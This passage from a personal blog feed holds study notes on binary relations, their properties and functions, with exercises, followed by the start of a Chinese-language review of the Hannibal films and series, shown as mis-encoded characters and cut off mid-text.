superset.</p><p>$|;\in$ follows by</p><p>Composition: If R1âŠ†SÃ—T and R2âŠ†TÃ—U then R1;R2 âŠ† SÃ—U:</p><script type="math/tex; mode=display">R1;R2 \overset{def}{=} \{(s,u) \in S \times U: \quad \text{there exists t} \in \text{T such that (s,t)} \in \text{R1 and (t,u)} \in \text{R2}\}</script><p>Firstly, <code>|</code> and $\in$ mean that leftside is an element, and the right side is a set.</p><p>Secondly, <code>|</code> means the element can divide</p><p><code>&lt;(&#123;2&#125;)(on X): &#123;3,4&#125;</code></p><p>Note it is a image on X. â€œon Xâ€ means XxX, and {2} is an image(or namely subset) of X, â€˜&lt;â€™ is relation, itâ€™s looking forward to the set with imageâ€™s elements.</p><p>The domain and co-domain are always X, donâ€™t understand it as <strong>{2}&lt;X</strong> according to <strong>xRy</strong>, and itâ€™s wrong, which means that {2} is the domain and X is the codomain.</p><p>It is image, and the concept above is almostly right but actually â€˜on Xâ€™ means the domain and codomain are always still X according to the definition of <strong>image</strong>.</p><h1 id="Properties-of-Binary-Relations"><a href="#Properties-of-Binary-Relations" class="headerlink" title="Properties of Binary Relations"></a>Properties of Binary Relations</h1><h2 id="Definition-of-five-properties-of-Binary-Relations-Fun-Tot-Inj-Sur-Bij-of-R-subseteq-S-times-T"><a href="#Definition-of-five-properties-of-Binary-Relations-Fun-Tot-Inj-Sur-Bij-of-R-subseteq-S-times-T" class="headerlink" title="Definition of five properties of Binary Relations (Fun) (Tot) (Inj) (Sur) (Bij) of $R \subseteq S \times T$"></a>Definition of five properties of Binary Relations (Fun) (Tot) (Inj) (Sur) (Bij) of $R \subseteq S \times T$</h2><p>A binary relation $RâŠ†SÃ—C$ is:</p><div class="table-container"><table><thead><tr><th>Property</th><th>Name</th><th>Description</th></tr></thead><tbody><tr><td>(Fun)</td><td>functional</td><td>For all s âˆˆ S there is at most one t âˆˆ T such that (s,t) âˆˆ R</td></tr><tr><td>(Tot)</td><td>total</td><td>For all s âˆˆ S there is at least one t âˆˆ T such that (s,t) âˆˆ R</td></tr><tr><td>(Inj)</td><td>injective</td><td>For all t âˆˆ T there is at most one s âˆˆ S such that (s,t) âˆˆ R</td></tr><tr><td>(Sur)</td><td>surjective</td><td>For all t âˆˆ T there is at least one s âˆˆ S such that (s,t) âˆˆ R</td></tr><tr><td>(Bij)</td><td>bijective</td><td>Injective and surjective</td></tr></tbody></table></div><h2 id="Functions-and-function-properties"><a href="#Functions-and-function-properties" class="headerlink" title="Functions and function properties"></a>Functions and function properties</h2><p>Note, all of the five properties are <strong>not related to function directly</strong>, even functional (Fun) is not. The adjustives have different meanings with the function(noun). (Fun)â€™s domain is <strong>not required all the inputs</strong> of domain have a value. (Tot)â€™s input may have multiple <strong>values in the co-domain</strong>, hence they are <strong>not function</strong> directly.</p><p>(Fun) and (Tot) emphasize the <strong>domain</strong>, and (Inj), (Sur) and (Bij) emphasize the <strong>co-domain</strong>.</p><p>But if the adjectives are changed into noun with the suffix of â€˜tionâ€™, that means they are functions.</p><p><strong>partial function</strong> is a binary relation that is (Fun).</p><p>A <strong>function</strong> is a binary relation that is (Fun) and (Tot).</p><p>An <strong>injection</strong> is a function that is (Inj).</p><p>A <strong>surjection</strong> is a function that is (Sur).</p><p>A <strong>bijection</strong> is a function that is (Bij).</p><p><img src="/2024/10/03/Math/relation/2024-10-06-09-43-59.png" alt></p><p><img src="/2024/10/03/Math/relation/2024-10-06-09-44-12.png" alt></p><p><img src="/2024/10/03/Math/relation/2024-10-06-09-44-23.png" alt></p><p><img src="/2024/10/03/Math/relation/2024-10-06-09-44-33.png" alt></p><h2 id="Properties-of-Binary-Relations-R-subseteq-S-times-S-R-AR-S-AS-T"><a href="#Properties-of-Binary-Relations-R-subseteq-S-times-S-R-AR-S-AS-T" class="headerlink" title="Properties of Binary Relations $R \subseteq S \times S$:(R)(AR)(S)(AS)(T)"></a>Properties of Binary Relations $R \subseteq S \times S$:(R)(AR)(S)(AS)(T)</h2><h3 id="Definition"><a href="#Definition" class="headerlink" title="Definition"></a>Definition</h3><div class="table-container"><table><thead><tr><th>Property</th><th>Name</th><th>Description</th></tr></thead><tbody><tr><td>(R)</td><td>reflexive</td><td>For all x âˆˆ S: (x,x) âˆˆ R</td></tr><tr><td>(AR)</td><td>antireflexive</td><td>For all x âˆˆ S: (x,x) âˆ‰ R</td></tr><tr><td>(S)</td><td>symmetric</td><td>For all x,y âˆˆ S: If (x,y) âˆˆ R then (y,x) âˆˆ R</td></tr><tr><td>(AS)</td><td>antisymmetric</td><td>For all x,y âˆˆ S: If (x,y) and (y,x) âˆˆ R then x = y</td></tr><tr><td>(T)</td><td>transitive</td><td>For all x,y,z âˆˆ S: If (x,y) and (y,z) âˆˆ R then (x,z) âˆˆ R</td></tr></tbody></table></div><p>Identity: (diagonal, equality) I ={(x,x):x âˆˆ S }, it statisfy among <strong>reflexive</strong> and <strong>symmetric</strong> and <strong>antisymmetric</strong>.</p><p>Antisymmetric can contain the identity(part of symmetric).</p><p><strong>Take Notice</strong></p><ol><li>Properties have to hold for all elements</li><li>(S), (AS), (T) are conditional statements â€“ they will hold if there is nothing which satisfies the â€˜ifâ€™ part</li></ol><p>A relation can be <strong>both symmetric and antisymmetric</strong>. Namely, when R consists <strong>only of some pairs (x,x),x âˆˆ S</strong>.</p><p>A relation <strong>cannot be simultaneously reflexive and antireflexive (unless S = âˆ…)</strong>.</p><p>For example, <strong>antisymmetric</strong> is different from <strong>non-symmetric</strong>. <strong>Antisymmetric</strong> means every elements hold that they dont have the symmetric pairs except their reflexive pairs. And <strong>antireflexive</strong> has the similar effects with <strong>antireflexive</strong>, <strong>antireflexive</strong> is different from <strong>non-reflexive</strong>.</p><p>Note the second notice, it satisfy the <a href="https://senranja.github.io/2024/09/27/Math/vacuous-truth/">vacuous truth</a> if there is nothing which satisfies.</p><h3 id="examples-by-graph"><a href="#examples-by-graph" class="headerlink" title="examples by graph"></a>examples by graph</h3><p><img src="/2024/10/03/Math/relation/2024-10-06-09-55-41.png" alt></p><p><img src="/2024/10/03/Math/relation/2024-10-06-09-55-56.png" alt></p><p><img src="/2024/10/03/Math/relation/2024-10-06-09-56-09.png" alt></p><p><img src="/2024/10/03/Math/relation/2024-10-06-09-56-22.png" alt></p><p><img src="/2024/10/03/Math/relation/2024-10-06-09-56-36.png" alt></p><h3 id="exercise"><a href="#exercise" class="headerlink" title="exercise"></a>exercise</h3><p>The following relations are on S = {1,2,3}. Which of the properties (R), (AR), (S), (AS), (T) does each satisfy?</p><p>(m,n) âˆˆ R if m+n =3? (AR) and (S)</p><p>(AR) and (S)</p><p>(m,n) âˆˆ R if max{m,n} = 3? (S)</p><p>(S)</p><hr><p>Give examples of relations with specified properties.</p><p>(AS), (T), not (R)</p><ul><li><p>Strict order of numbers x &lt; y</p></li><li><p>â‰¤ but with some pairs (x,x) removed</p></li><li><p>Being a prime divisor: (p,n) âˆˆ R iff p is prime and p|n</p></li><li><ul><li>Not reflexive: (1,1) / âˆˆ R</li></ul></li><li><ul><li>Transitivity is meaningful only for the pairs (p,p),(p,n) p|n for p prime</li></ul></li></ul><p>(S), not (R), not (T)</p><ul><li>Simplest example- inequality</li></ul><hr><script type="math/tex; mode=display">R \subseteq \mathbb{N}^2 \times \mathbb{N}^2 \implies R \subseteq (\mathbb{N} \times \mathbb{N}) \times ( \mathbb{N} \times \mathbb{N})</script><p>$\mathbb{N} \times \mathbb{N}$ is a set of pairs, such as ((1,2),(2,3)). It demands that $(m,n)R(p,q)$ if $ m \equiv p \pmod{3} $ or $n \equiv q \pmod{5}$</p><p>(a) Is R reflexive?</p><p>Yes: m =(3) m so (m,n)R(m,n).</p><p>(b) Is R symmetric?</p><p>Yes: by symmetry of Â· =(n) Â·.</p><p>(c) Is R transitive?</p><p>No: Consider (1,1), (1,4) and (2,4).</p><p>Analysis</p><p>R is a relation on $\mathbb{N} \times \mathbb{N}$, i.e. it is a subset of $\mathbb{N}^2 \times \mathbb{N}^2$ </p><p>$(m,n)R(p,q)$ if $m \underset{(3)}{=} p$ or $n \underset{(5)}{=} q$</p><p>And then you would easily know the options a and b</p><p>How to prove option c?</p><p>Notice that the pairs of the two point pairs, it uses OR to connect. We can find (0,0)R(0,1) is right, and (0,1)R(1,1) is right, but (0,0)R(1,1) is <strong>obviously wrong</strong>.</p><p><img src="/2024/10/03/Math/relation/2024-10-06-10-18-24.png" alt></p><h1 id="Functions"><a href="#Functions" class="headerlink" title="Functions"></a>Functions</h1><p>Definition</p><p>A <strong>function</strong>, f : S â†’ T, is a binary relation f âŠ† SÃ—T that satisfies (Fun) and (Tot). That is, for all s âˆˆ S there is exactly one t âˆˆ T such that (s,t) âˆˆ f.</p><p>We write f(s) for the unique element related to s.</p><p>We write $T^S$ for the set of all functions from S to T.</p><p><img src="/2024/10/03/Math/relation/2024-10-06-10-21-26.png" alt></p><p>f : S â†’T describes pairing of the sets: it means that f assigns to every element s âˆˆ S a unique element t âˆˆ T. To emphasise where a specific element is sent, we can write f : x â†’ y, which means the same as f(x) = y</p><div class="table-container"><table><thead><tr><th>Symbol</th><th>Symbol</th><th>Symbol</th><th>Description</th></tr></thead><tbody><tr><td>S</td><td>domain of f</td><td>Dom(f)</td><td>(inputs)</td></tr><tr><td>T</td><td>co-domain of f</td><td>Codom(f)</td><td>(possible outputs)</td></tr><tr><td>f(S)</td><td>image of f</td><td>Im(f)</td><td>(actual outputs)</td></tr><tr><td>S</td><td>domain of f</td><td>Dom(f)</td><td>(inputs)</td></tr></tbody></table></div><p><code>=&#123;f(x):x âˆˆ Dom(f) &#125;</code> is original in slides, I omit it in my write up. It looks like to describe <code>f(S)</code>, and I guess it may be a typo: it should be <code>=&#123;f(x):x âˆˆ Dom(S) &#125;</code>.</p><p>f is a relation with domain and co-domain, and <strong>f(S)</strong> constrain the subset of domain, and <strong>f(S)</strong> means the actual output set (all output in the set can find its intput in pre-image ).</p><p>Important! The domain and co-domain are critical aspects of a functionâ€™s definition.</p><script type="math/tex; mode=display">f: \mathbb{N} \rightarrow \mathbb{Z} \quad \text{given by} \quad f(x) \rightarrow x^2</script><p>and</p><script type="math/tex; mode=display">g: \mathbb{N} \rightarrow \mathbb{N} \quad \text{given by} \quad g(x) \rightarrow x^2</script><p>are different functions even though they have the same behaviour!</p><h2 id="Converse-of-a-function"><a href="#Converse-of-a-function" class="headerlink" title="Converse of a function"></a>Converse of a function</h2><p>Q: $f^\leftarrow$ is a relation; when is it a function?</p><p>A: When f satisfies (Inj) and (Sur)â€“ i.e. when f is a bijection.</p><h2 id="Properties-of-bijections"><a href="#Properties-of-bijections" class="headerlink" title="Properties of bijections"></a>Properties of bijections</h2><p>Suppose f : S â†’ T and g : T â†’U are bijections</p><p>Fact</p><p>$f^\leftarrow: T \rightarrow S$ and $g^\leftarrow: U \rightarrow T$ are bijections</p><p>$(f ; g) : S â†’ U$ is a bijection</p><p>$f;f^\leftarrow = I_S = {(x,x) : x âˆˆ S}$ and $f^\leftarrow;f=I_T={(x,x) : x âˆˆ T}$</p><p>Fact</p><p>f : S â†’T is a bijection if and only if there is a g : T â†’ S such that $f;g=I_S$ and $g;f=I_T$</p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ±‰å°¼æ‹”</title>
      <link href="/2024/10/01/trivia/Hannibal/"/>
      <url>/2024/10/01/trivia/Hannibal/</url>
      
        <content type="html"><![CDATA[<p>æ±‰å°¼æ‹”è§‚åæ„Ÿ</p><p>ä»Šå¤©2024å¹´10æœˆ1æ—¥ï¼Œçœ‹å®Œæ±‰å°¼æ‹”ç”µè§†å‰§ä¸‰å­£ã€‚</p><ul><li><a href="#æ²‰é»˜çš„ç¾”ç¾Š">ã€Šæ²‰é»˜çš„ç¾”ç¾Šã€‹</a></li><li><a href="#hannibal">ã€ŠHannibalã€‹</a></li></ul><h1 id="ã€Šæ²‰é»˜çš„ç¾”ç¾Šã€‹"><a href="#ã€Šæ²‰é»˜çš„ç¾”ç¾Šã€‹" class="headerlink" title="ã€Šæ²‰é»˜çš„ç¾”ç¾Šã€‹"></a>ã€Šæ²‰é»˜çš„ç¾”ç¾Šã€‹</h1><p>æœ€æ—©å¤§æ¦‚æ˜¯2021å¹´ï¼Œç”¨ç€åˆšä¹°çš„Ipadçœ‹äº†ä¸€äº›è‹±æ–‡ä¸–ç•Œçš„ç»å…¸ç”µå½±ï¼Œæ¯”å¦‚ã€Šæ²‰é»˜çš„ç¾”ç¾Šã€‹ï¼ˆThe Silence of the Lambsï¼‰ï¼ˆç”µå½±ï¼Œ1991å¹´é¦–æ˜ ï¼‰ã€‚ä¸ªäººç®€è¯„ï¼Œç”µå½±å™äº‹ç®€æ´æ¸…æ™°ï¼Œæ•…äº‹çº¿æ¸…æ™°åˆ©è½ï¼Œé€‚åˆå®‰é™è§‚å½±ä½“éªŒèˆ’æœï¼Œå¾ˆæ˜¯å–œæ¬¢è¿™ç§å¹³é™ã€ç´§å¼ ã€å¹²å‡€çš„å½±ç‰‡èŠ‚å¥ã€‚</p><p>å…‹ä¸½ä¸Â·å²è¾¾ç³ï¼ˆJodie Foster é¥°ï¼‰ä½œä¸ºFBIå®ä¹ ç”Ÿï¼Œä¸€å¼€å§‹è°ƒæŸ¥é‡ç‰›æ¯”å°”ï¼Œè¯·æ±‚è¢«å›šç¦çš„å¿ƒç†å­¦åšå£«æ±‰å°¼æ‹”Â·è±å…‹ç‰¹ï¼ˆSir Philip Anthony Hopkins é¥°ï¼‰çš„å¸®åŠ©ï¼Œæœ€åç‹¬è‡ªçªå‡»å‡¶æ‰‹ä½å¤„ï¼Œç”¨è‡ªå·±çš„æ²‰ç¨³ã€æ™ºæ…§ã€è­¦è§‰äºé»‘æš—ä¹‹ä¸­å‡»æ¯™äº†æ€äººé­”ã€‚</p><p>æ²¡æœ‰äºŒåˆ·è¿‡è¿™ä¸ªå½±ç‰‡ï¼Œæ—¶éš”ä¸‰å¹´åçš„æˆ‘å†æ¬¡ä»…å€Ÿè„‘æµ·ä¸­çš„ã€Šæ²‰é»˜çš„ç¾”ç¾Šã€‹çš„è¯„ä»·ï¼Œæˆ‘è®¤ä¸ºæ˜¯æœ‰ä»·å€¼çš„ï¼Œå› ä¸ºç»å…¸ä¸ä¼šéšæ—¶é—´è¿‡æ—¶ã€‚å½±ç‰‡ä¸­å²è¾¾ç³è¢«ä¸Šçº§æŒ‡æ´¾ç‹¬è‡ªè°ƒæŸ¥æ€äººé­”ã€å¯»æ±‚æ±‰å°¼æ‹”çš„å¸®åŠ©ï¼Œå…¨ç¨‹æ²¡æœ‰ä»»ä½•æŠ±æ€¨ï¼Œå®‰é™çš„æ‰§è¡Œä»»åŠ¡ï¼Œé»˜é»˜åœ°æ€è€ƒã€‚å½“å¥¹è¿›å…¥ç²¾ç¥ç—…ç›‘ç‹±æ—¶ï¼Œè™½æœ‰ææƒ§ï¼Œä½†æ˜¯è§åˆ°æ±‰å°¼æ‹”ï¼Œéœ²å‡ºäº†è‡ªä¿¡ã€å¹²å‡€åœ°å¾®ç¬‘å»äº¤è°ˆï¼Œæˆ‘ç›¸ä¿¡æ±‰å°¼æ‹”å½“æ—¶ç¬¬ä¸€çœ¼å¯èƒ½çœ‹ä¸ä¸Šè¿™ä¸ªå°å¥³å­©ï¼Œä»–åªæ˜¯å¤ªå¯‚å¯ï¼Œä¸€å¼€å§‹åªæ˜¯æ‹¿å²è¾¾ç³äº¤æ¢èº«ä¸–åšåˆ†æè§£é—·ï¼Œä½†æ˜¯ç›¸åˆ«çš„æ—¶å€™çªç„¶å‘ç°å²è¾¾ç³çš„ç‰¹åˆ«ï¼Œå› æ­¤å‘Šè¯‰äº†å²è¾¾ç³è‡ªå·±å¯¹æ€äººé­”çš„åˆ†ææƒ…æŠ¥ã€‚</p><p>ã€Šæ²‰é»˜çš„ç¾”ç¾Šã€‹ä¸­ï¼Œå¯ä»¥ç›´æ¥è§‚å¯Ÿåˆ°å²è¾¾ç³çš„æ²‰ç€å†·é™ï¼šå²è¾¾ç³åœ¨SWATæ ¹æ®ä¸Šçº§ä¹ æƒ¯æ€§å¿½ç•¥è‡ªå·±æƒ…æŠ¥ã€æ²¡æœ‰ä»»ä½•å¤–æ´çš„æƒ…å†µä¸‹ï¼Œè°ƒæŸ¥åˆ°å«Œç–‘çŠ¯å®¶ä¸­ï¼Œå‘ç°ä½œæ¡ˆç°åœºã€‚æ€äººé­”æ­¤æ—¶æ–­ç”µï¼Œå‘†ç€å¤œè§†ä»ªä»”ç»†ç«¯è¯¦å²è¾¾ç³çš„æ…Œä¹±ã€ç´§å¼ çš„è¡¨æƒ…ï¼Œåƒä¸€è·³åŒåŒçš„è›‡ï¼Œæˆè°‘çš„çœ‹ç€çŒç‰©æ…¢æ…¢æ¥è¿‘ï¼›å²è¾¾ç³ä¾é å¬è§‰ï¼Œæ•é”çš„æ‰£åŠ¨æ‰³æœºï¼Œå‡»æ¯™äº†é»‘æš—ä¹‹ä¸­çš„æ€äººé­”ã€‚</p><p>å¦å¤–çš„ä¸»è§’ï¼Œä¾¿æ˜¯æ±‰å°¼æ‹”ï¼Œç”±äºæ€äººé­”æŠ“èµ°äº†è®®å‘˜çš„å¥³å„¿ï¼Œç›‘ç‹±é•¿ä¸ºè°„åªšï¼Œä½†æ˜¯è‡ªå·±æ™ºæ…§ä¸å¦‚å²è¾¾ç³é‚£æ ·å¬å¾—å‡ºæ±‰å°¼æ‹”å’Œå²è¾¾ç³äº¤è°ˆçš„æƒ…æŠ¥ï¼Œç›´æ¥ç§è‡ªç”¨åˆ‘æ‹·é—®æ±‰å°¼æ‹”ã€‚è€æ±‰ä»å¤´åˆ°å°¾éƒ½ä¿æŒç€æˆè°‘è€Œæ–‡æ˜çš„å¾®ç¬‘ï¼Œè¿™ä½“ç°äº†æ±‰å°¼æ‹”çš„è‡ªå§‹è‡³ç»ˆçš„è´µæ—åšæ´¾ã€ç»å¢ƒä¸‹ä¾ç„¶ä¿æŒè‡ªå·±çš„ä½“é¢ä¸ä¼˜é›…ã€‚æ±‰å°¼æ‹”æ€æ‰è­¦å«ï¼Œå‰²ä¸‹äº†ä¸€ä¸ªè­¦å‘˜çš„è„¸è¿›è¡Œäº†æœ€åŸå§‹çš„ä¼ªè£…æˆåŠŸå‡ºé€ƒï¼Œè¿™ä½“ç°äº†Dr.æ±‰å°¼æ‹”çš„å‡¶æ®‹å—œè¡€ã€æ™ºæ…§ï¼šæ€ç»´æ‰“ç ´è§„åˆ™ã€å°±åœ°å–æï¼Œçœ‹ä¼¼åœ¨ç›‘ç‹±ä¸­ä¸€ç´ å¸¦ç€å¾®ç¬‘ã€è€å®æœ¬åˆ†çš„é‚£ä¸ªé«˜å­¦å†è´µæ—ï¼Œè¡ŒåŠ¨å´å‡ºäººæ„æ–™çš„åˆé’»ã€è¡€è…¥ã€æ•æ·ã€æœ‰æ•ˆã€‚ä¸­æ–‡â€œé™å¦‚å¤„å­ï¼ŒåŠ¨å¦‚è„±å…”â€ï¼Œå¦å¤–æœ‰ä¸€ä¸ªå¾ˆç®€çŸ­çš„è‹±è¯­å•è¯ä¹Ÿæ›´åˆé€‚â€œStrikingâ€ã€‚</p><p>å²è¾¾ç³å’Œæ±‰å°¼æ‹”éƒ½æœ‰ç€æ²‰é»˜ã€æ€è€ƒã€ä¼˜é›…çš„å“è´¨ï¼Œè§‚å½±è§’åº¦çœ‹ï¼Œä¸¤äººè¯ä¸å¤šï¼Œå´å­—å­—ç ç‘æ‰£äººå¿ƒå¼¦ï¼Œä½œä¸ºçŠ¯ç½ªæƒŠæ‚šç‰‡å½±è§†çš„èµ·æ­¥ï¼Œå®åœ¨ä»¤äººå°è±¡æ·±åˆ»ã€‚æˆ‘åˆçœ‹æ—¶ï¼Œä»¥ä¸ºåªæœ‰å²è¾¾ç³æ˜¯ä¸»è§’ï¼Œæ±‰å°¼æ‹”åªæ˜¯ä¸€ä¸ªç±»ä¼¼äºå…ˆçŸ¥çš„ã€æƒ…æŠ¥ä½œç”¨ä»…æ¨åŠ¨å‰§æƒ…è¿›è¡Œçš„è§’è‰²ï¼Œå´æ²¡æœ‰æƒ³åˆ°è¿™ä¸ªç”·äººæœ€ååˆ©ç”¨æ®‹å¿å’Œæ™ºæ…§è½»æ¾é€ƒç¦»ã€‚ç»“å±€æ˜¯å¼€æ”¾å¼çš„ï¼Œæˆ‘ä»¬ä¸çŸ¥é“å²è¾¾ç³èƒ½ä¸èƒ½åœ¨FBIé‚£æ ·å¯¹å¥³æ€§ä¸å‹å¥½çš„å‹æŠ‘çš„æ°›å›´ä¸­å› æ­¤ç«™èµ·ï¼Œä¹Ÿä¸çŸ¥é“æ±‰å°¼æ‹”è¿œçœºç²¾ç¥ç—…é™¢é•¿çš„ç›®å…‰ä¸­æœ‰æ²¡æœ‰å…¶ä»–çš„æ‰“ç®—ã€‚è¿™éƒ¨ç”µå½±ç•™ä¸‹äº†éå¸¸é•¿çš„éæƒ³ç©ºé—´ã€‚</p><h1 id="ã€ŠHannibalã€‹"><a href="#ã€ŠHannibalã€‹" class="headerlink" title="ã€ŠHannibalã€‹"></a>ã€ŠHannibalã€‹</h1><p>æ±‰å°¼æ‹”ç”µè§†å‰§ï¼ˆMads Dittmann Mikkelsené¥°ï¼‰æœ‰ä¸‰éƒ¨ï¼Œè‡ªæˆ‘è¯­è¨€ç­æ¥è§¦åšä¸»â€œæ±‰å°¼æ‰³â€å¼€å§‹çœ‹ï¼šæ±‰å°¼æ‹”å°æ›²ï¼ˆFadedå¼‚åŸŸï¼‰é…åˆæ±‰å°¼æ‹”çš„è¡Œä¸ºç€å®ä»¤äººçœ‹ç€æœ‰è¶£ï¼ŒçŸ«æ‰é€ ä½œçš„ä¼˜é›…ã€é£Ÿè€…è¢«æ€çš„ä»æ…ˆã€ç”¨é¤æ—¶çš„æƒŠæ‚šã€‚å› æ­¤æˆ‘èŠ±äº†ä¸¤ä¸ªæœˆæ—¶é—´ï¼ŒæŠŠæ±‰å°¼æ‹”ä¸‰å­£çœ‹å®Œäº†ã€‚</p><p>æˆ‘ä½œä¸ºç¬”è€…ï¼Œåœ¨çœ‹å®Œç¬¬ä¸€å­£æˆ–è€…ç¬¬äºŒå­£ï¼Œæˆ‘æƒ³å†™ä¸€äº›è§‚åæ„Ÿï¼Œä½†æ˜¯æ„Ÿè§‰è‡ªå·±æ²¡æœ‰çœ‹åˆ°å¤§ç»“å±€ï¼Œæˆ‘çš„æ‰€å†™æ˜¯ä¸å®Œæ•´çš„ï¼Œè™½ç„¶çœ‹åˆ°å¤§ç»“å±€å‰ï¼Œæˆ‘ä¹Ÿäº§ç”Ÿå¤§é‡çš„æƒ…ç»ªã€æ„Ÿæ‚Ÿã€æ€è€ƒï¼Œä½†æ˜¯ç›´æ¥åŠè·¯æ‹¿å‡ºæ¥å’Œäººè®¨è®ºã€åˆ†æï¼Œä¼šå½±å“æˆ‘åé¢çš„è§‚æ„Ÿä½“éªŒï¼Œæˆ‘ä¸å€¾å‘äºè¿™ä¹ˆåšã€‚è§‚å½±å’Œå†™è§‚åæ„Ÿæœ€å¥½çš„åŠæ³•ï¼Œå°±æ˜¯å…³é—­å¼¹å¹•ï¼Œè‡ªå·±æ…¢æ…¢ç”¨å¿ƒä»å¤´çœ‹åˆ°ç»“å±€ï¼Œæ¯ä¸€ä¸ªäººç‰©çš„è¨€è¡Œéƒ½å€¼å¾—æ…¢æ…¢åœ°åˆ†æå’Œæ€è€ƒï¼Œè€Œä¸æ˜¯å‡ºäºè‡ªå·±æ—ºç››åœ°åˆ†äº«æ¬²è¿‡æ—©åœ°å‘±å™ªã€‚</p><p>ç¬¬ä¸€å­£è¿›å±•èŠ‚å¥ç¼“æ…¢ï¼Œæˆ‘æƒ³è¿™åº”è¯¥ä¹Ÿæ˜¯å¯¼è‡´æ±‰å°¼æ‹”æ”¶è§†ç‡ä½è¿·åœ°åŸå› ã€‚ç¬¬ä¸€å­£åœ¨æ…¢æ…¢çš„åšé“ºå«ï¼Œæ²¡æœ‰å•†ä¸šç‰‡ä¸€è´¯çš„çªå¦‚å…¶æ¥çš„å€’å™ï¼Œæ²¡æœ‰æ¬²æŠ‘å…ˆæ‰¬çš„åšäººçœ¼çƒçš„å¥—è·¯ï¼Œæ²¡æœ‰ç®€å•è´´äººè®¾å°±å¼€å§‹ç‹‚æ¨å‰§æƒ…çš„ç²—ç³™ï¼Œæ²¡æœ‰ç…½æƒ…ä¹‹æ—¶å°±æ‰çœ¼æ³ªå¼€å§‹çœŸæƒ…åéœ²çš„ç¾å‰§å¥—è·¯ã€‚æ±‰å°¼æ‹”ç¬¬ä¸€å­£ï¼Œå°±æ˜¯åœ¨è€è€å®å®çš„é“ºå«ï¼Œå„ç§ç¦»å¥‡è¡€è…¥çš„æ¡ˆä»¶ï¼Œç¥å‡ºé¬¼æ²¡çš„è¿ç¯æ€äººçŠ¯ï¼Œæ€¥å¿ƒæ‰æ‹¿å«ŒçŠ¯çš„FBIé•¿å®˜Jackï¼Œè¢«Jackæ‹–è¿›çŠ¯ç½ªè€…å…±æƒ…æ³¥æ½­çš„Willï¼Œä»¥åŠéšè—åœ¨å¿ƒç†å­¦æƒå¨ã€FBIåˆä½œè€…çš„å…‰ç¯åç‰Œèº«ä»½ä¸‹ã€æ²¡æœ‰äººèƒ½ä»é‚£å¼ è„¸ä¸Šè¯»æ‡‚å†…å¿ƒæƒ³æ³•çš„Dr. Hannibal Lecterã€‚Willæ˜¯ç¬¬ä¸€å­£çš„ä¸»è§’ï¼ŒæŸ¥æ¡ˆè¿‡ç¨‹ä¸­è¢«Hannibalä¸€æ­¥æ­¥å¼•å¯¼ã€æš—ç¤ºã€æ‹–å…¥æ³¥æ½­ï¼Œæœ€åä¸€åˆ»æ‰æ„è¯†åˆ°Hannibalæ˜¯ä¸€åˆ‡çš„æ¶é­”ï¼Œä½†æ˜¯å«å†¤å…¥ç‹±ã€‚</p><p>ç¬¬ä¸€å­£æœ€impressiveçš„æ„Ÿæ‚Ÿä¾¿æ˜¯ï¼ŒWillèº«ä¸Šçš„ç‰¹æœ‰å“è´¨ï¼Œåœ¨å„ç§ç»æœ›ä¸­ï¼Œå³ä¾¿è®¤çŸ¥å‡ºç°é‡å¤§éšœç¢ï¼ŒWillå§‹ç»ˆèƒ½åšå®šä¿æŒè‡ªæˆ‘æœ¬å¿ƒã€‚è€ŒHannibalï¼Œæ˜¯ä¸ªè¯ä¸å¤šçš„é«˜å­¦å†è´µæ—ï¼Œæ²‰ç€å†·é™ï¼Œä¸¾æ­¢ä¼˜é›…å‹å–„ï¼Œä»¥è‡³äºå‰§ä¸­å¾ˆå¤šäººæ— æ³•è”æƒ³åˆ°ä»–æ˜¯é‚£ä¸ªçœŸæ­£çš„æ¶é­”ã€‚</p><p>ç¬¬äºŒå­£ï¼ŒWillé€æ­¥å¯Ÿè§‰ã€ç¡®å®šè‡ªå·±åœ¨è¢«Hannibalç©å¼„ï¼Œä½†æ˜¯Willåè€Œå‡­å€Ÿè‡ªå·±çš„é«˜æ™ºå•†ã€å…±æƒ…èƒ½åŠ›ï¼Œå‘ç°è‡ªå·±èƒ½ç†è§£Hannibalï¼Œèƒ½é€šè¿‡å’ŒHannibaläº¤è°ˆæ¥å‘æŒ¥è‡ªå·±profileæ€äººçŠ¯çš„æ½œåŠ›ã€‚ä½†æ˜¯Abigalçš„æ­»å´æ˜¯Willå¿ƒä¸­çš„å¯¹Hannibalåˆºï¼ŒWillå–œæ¬¢Abigalï¼Œä½†æ˜¯HannibalæŠŠAbigalæ€äº†ï¼ŒWillè¿·èŒ«äº†ã€‚ä»–åœ¨äºHannibaläº¤æµçš„è¿‡ç¨‹ä¸­ï¼Œä¹Ÿå¯Ÿè§‰è‡ªå·±ç”±äºé•¿æœŸå…±æƒ…å„ç§å„æ ·çš„æ€äººçŠ¯ï¼Œå—œè¡€çš„ä¸€é¢è¢«æ…¢æ…¢å¼•å¯¼å‡ºæ¥äº†ã€‚Hannibalæ•é”çš„é—»åˆ°äº†Willèº«ä¸Šå¥³è®°è€…çš„é¦™æ°´å‘³é“ï¼Œéšåä¸€å¤œï¼Œä¹Ÿæ¥åˆ°äº†é‚£å¥â€œThey knowâ€ï¼Œå†³æˆ˜æ¥äº†ã€‚Hannibalä¾ç„¶åœ¨ç­‰Willï¼Œç­‰Willè¦ä¸è¦åšå®šåœ°é€‰æ‹©å’Œä»–ç¦»å¼€ã€‚ä½†æ˜¯Willä¾ç„¶é€‰æ‹©åšæŒè‡ªå·±çš„æœ¬å¿ƒï¼Œä»–å¸Œæœ›æŠŠHannibalç›‘ç¦èµ·æ¥ï¼Œè¿™æ 